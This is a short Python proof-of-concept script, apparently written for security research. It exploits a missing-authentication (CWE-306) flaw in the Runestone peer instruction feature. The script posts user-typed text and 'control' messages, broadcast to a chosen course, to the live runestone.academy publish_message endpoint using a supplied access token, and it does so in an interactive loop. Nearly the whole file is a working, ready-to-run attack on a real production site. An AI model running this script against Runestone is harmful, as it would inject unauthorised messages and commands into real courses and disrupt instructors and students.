# Security Research PoC
#
# Written by Kameron Barnes on September 21, 2026
# This file demonstrates a CWE-306 vulnerability within the Runestone
# peer instruction section.

import requests
import argparse
from datetime import datetime

parser = argparse.ArgumentParser(
    description="Proof-of-concept code that exploits CWE-306 to execute commands"
)

parser.add_argument(
    "access_token", help="The token used by Runestone to authenticate a user", type=str
)

parser.add_argument("course_name", help="Target course", type=str)

parser.add_argument(
    "div_id", help="The name of the peer instruction assignment", type=str
)

args = parser.parse_args()

url = "https://runestone.academy/"
endpoint = url + "assignment/peer/api/publish_message"
payload = {
    "type": "text",
    "from": "Runestone CWE-306",
    "broadcast": True,
    "course_name": args.course_name,
    "div_id": args.div_id,
}

headers = {
    "User-Agent": (
        "Mozilla/5.0 (X11; Linux x86_64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/152.0.0.0 Safari/537.36"
    ),
    "Cookie": f"access_token={args.access_token}",
}

while True:
    now = datetime.now().timestamp()
    message = input(">> ")
    split = message.split(" ")

    if split[0] == "c":
        payload["type"] = "control"
        payload["message"] = split[1]
    else:
        payload["type"] = "text"
        payload["message"] = message

    payload["time"] = now
    r = requests.post(
        endpoint,
        headers=headers,
        json=payload,
    )
    if r.status_code == 200:
        print("Success")
    else:
        print("Failed")
